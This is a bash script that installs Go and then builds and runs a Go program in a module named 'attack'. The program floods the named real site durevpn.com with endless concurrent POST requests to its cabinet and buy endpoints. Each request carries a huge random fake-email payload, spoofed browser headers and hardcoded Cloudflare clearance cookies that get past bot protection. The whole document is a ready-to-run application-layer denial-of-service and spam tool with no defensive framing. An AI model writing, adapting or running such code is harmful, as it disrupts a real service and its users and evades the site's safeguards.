#!/bin/bash
set -e

if ! command -v go &> /dev/null; then
    echo "Устанавливаю Go..."
    wget -q https://go.dev/dl/go1.21.5.linux-amd64.tar.gz
    tar -C /usr/local -xzf go1.21.5.linux-amd64.tar.gz
    export PATH=$PATH:/usr/local/go/bin
    echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
fi

WORKDIR=$(mktemp -d)
cd "$WORKDIR"

cat > main.go << 'EOF'
package main

import (
	"bytes"
	"crypto/rand"
	"crypto/tls"
	"flag"
	"io"
	"math/big"
	"net/http"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"
)

const (
	defaultWorkers        = 200
	defaultRequestTimeout = 10 * time.Second
	minSize               = 10000
	maxSize               = 50000
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:150.0) Gecko/20100101 Firefox/150.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
}

type requestType int

const (
	cabinet requestType = iota
	buy
)

type task struct {
	typ  requestType
	size int
}

func main() {
	domain := flag.String("domain", "sdfg.ru", "email domain")
	workers := flag.Int("workers", defaultWorkers, "workers")
	flag.Parse()

	tasks := make(chan task, *workers*2)

	client := &http.Client{
		Timeout: defaultRequestTimeout,
		Transport: &http.Transport{
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
			MaxIdleConns:        *workers,
			MaxIdleConnsPerHost: *workers,
			MaxConnsPerHost:     *workers,
			IdleConnTimeout:     30 * time.Second,
		},
	}

	var wg sync.WaitGroup
	for i := 0; i < *workers; i++ {
		wg.Add(1)
		go worker(*domain, tasks, client, &wg)
	}

	go func() {
		for {
			typ := cabinet
			if n, _ := randInt(0, 1); n == 1 {
				typ = buy
			}
			size, _ := randInt(minSize, maxSize)
			tasks <- task{typ: typ, size: size}
		}
	}()

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM)
	<-stop

	close(tasks)
	wg.Wait()
}

func worker(domain string, tasks <-chan task, client *http.Client, wg *sync.WaitGroup) {
	defer wg.Done()
	for t := range tasks {
		var req *http.Request
		var err error

		switch t.typ {
		case cabinet:
			payload := randomAlpha(t.size)
			bodyStr := `["` + payload + `@` + domain + `"]`
			req, err = http.NewRequest("POST", "https://durevpn.com/ru/cabinet", bytes.NewReader([]byte(bodyStr)))
			if err != nil {
				continue
			}
			req.Header.Set("Referer", "https://durevpn.com/ru/cabinet")
			req.Header.Set("next-action", "4042db2edc943b672fa3ac96f53c691573aa45b68c")
			req.Header.Set("next-router-state-tree", `["",{"children":[["locale","ru","d"],{"children":["cabinet",{"children":["__PAGE__",{},null,null]},null,null]}},null,null,true]`)
			req.Header.Set("Cookie", "NEXT_LOCALE=ru; cf_clearance=cRSxQVMi8f_nWisN3l93WTOjuiyXAKlMRYFdbg4KE94-1776024721-1.2.1.1-gCLVXVlHYNUbtLlYCn.59x5zUHIw2SjmzkTNDvWBAo1p6rMWRsvFZq6hc5mxtcxVzEXuzs1IDmJA6d9TIbHiEe1_sNfdQdo2w0npG4Z5CoEgl1Z6MmKqKk7.Apn3hNB_oFBrehwNi_Bg5Qtc_vCX7SdsrSCwiA5epZCPGl088JGarGt0D70McL0QX0jl5TiKSHZ0Io_pbkRocPs1zEwW9EKKuoA7WJ7nAw_L1x7kt1lJaco9BabAK_GAQDXYKeJttGKqM92ECNYemkDhSdt5DZJg909JKKBQF4Xl.17H2eM.tqe3Z91r7smFGHTDxzDskMGzKUE.9OhkrYG6aJZEQ")
		case buy:
			smallPayload := randomAlpha(20)
			bigPayload := randomAlpha(t.size)
			bodyStr := `["` + smallPayload + `","` + bigPayload + `@` + domain + `"]`
			req, err = http.NewRequest("POST", "https://durevpn.com/ru/buy", bytes.NewReader([]byte(bodyStr)))
			if err != nil {
				continue
			}
			req.Header.Set("Referer", "https://durevpn.com/ru/buy")
			req.Header.Set("next-action", "60e99145361dcba5a5b9e8afe36502d70b29dfa095")
			req.Header.Set("next-router-state-tree", `["",{"children":[["locale","ru","d"],{"children":["buy",{"children":["__PAGE__",{},null,null]},null,null]}},null,null,true]`)
			req.Header.Set("Cookie", "NEXT_LOCALE=ru; cf_clearance=Vw8ohyaljxhfrvZKGXcOdMt6h.vlHewlzuvPz9cIbcg-1776025616-1.2.1.1-mrlquDyjhSK3JlmFKyiGSxdjVblKrbxeaYk1n4H_kv_KvBPtLf.vabUjeNwRi7Vfmvo0jHPs5WUL7t8Mi8sqhjLyulB4B3.HpIuk8TpJ9hXYYgIfUTg0l8JVjG8QGJLcGRjG2fh06ZjTepogQb0dD_GdhIcrD9B8xh4uqHEaGBVnC1HYEJMpya_Qu7bRdv_z9Q1U3pFWXkMfwWBg7_TB4O5798xkqS82qvukTuSAoFnFJiZedvv5OVHzML_kBdfzhMU7.6xAUIWMcoOLeBQcSItLkifo4pAwDVUVkoL58tybVYo7iqEbGlj9l8_ipxxwijDMmLqYU.0khZb3HJwZRQ")
		}
		if req == nil {
			continue
		}
		uaIdx, _ := randInt(0, len(userAgents)-1)
		req.Header.Set("User-Agent", userAgents[uaIdx])
		req.Header.Set("Accept", "text/x-component")
		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
		req.Header.Set("Accept-Encoding", "gzip, deflate, br, zstd")
		req.Header.Set("Content-Type", "text/plain;charset=UTF-8")
		req.Header.Set("Origin", "https://durevpn.com")
		req.Header.Set("Sec-GPC", "1")
		req.Header.Set("Connection", "keep-alive")
		req.Header.Set("Sec-Fetch-Dest", "empty")
		req.Header.Set("Sec-Fetch-Mode", "cors")
		req.Header.Set("Sec-Fetch-Site", "same-origin")
		req.Header.Set("DNT", "1")
		req.Header.Set("Priority", "u=0")
		req.Header.Set("TE", "trailers")

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}
}

func randomAlpha(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	b := make([]byte, n)
	rand.Read(b)
	for i := 0; i < n; i++ {
		b[i] = letters[int(b[i])%len(letters)]
	}
	return string(b)
}

func randInt(min, max int) (int, error) {
	n, err := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
	if err != nil {
		return min, nil
	}
	return int(n.Int64()) + min, nil
}
EOF

go mod init attack 2>/dev/null || true
go mod tidy 2>/dev/null || true
go run main.go "$@"
